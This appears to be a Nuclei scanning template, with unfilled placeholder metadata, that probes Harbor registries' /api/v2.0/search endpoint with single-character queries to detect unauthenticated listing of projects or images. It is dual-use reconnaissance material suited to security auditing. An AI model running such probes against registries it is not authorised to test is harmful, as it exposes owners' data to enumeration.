id: harbor-images-weak

info:
  name: Template Name
  author: wangzong
  severity: high
  description: description
  reference:
    - https://
  tags: tags

http:
  - raw:
      - |+
        GET /api/v2.0/search?q={{search}} HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: no-cache
        Accept-Language: zh-CN,zh;q=0.9
        Accept: application/json
        Pragma: no-cache
        Content-Type: application/json
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.48 Safari/537.36
        Referer: http://{{Hostname}}/account/sign-in?redirect_url=%2Fharbor%2Fprojects
        Accept-Encoding: gzip, deflate, br
        sec-ch-ua-platform: "Windows"
        sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="136", "Google Chrome";v="136"
        sec-ch-ua-mobile: ?0
        Connection: close

    payloads:
      search:
        - a
        - b
        - c
        - d
        - e
        - f
        - g
        - h
        - i
        - j
        - k
        - l
        - m
        - n
        - o
        - p
        - q
        - r
        - s
        - t
        - u
        - v
        - w
        - x
        - y
        - z
        - 0
        - 2
        - 3
        - 4
        - 5
        - 6
        - 7
        - 8
        - 9
        - 1        
      stop-at-first-match: true                
    matchers:
      - type: word
        words:
          - "creation_time"            
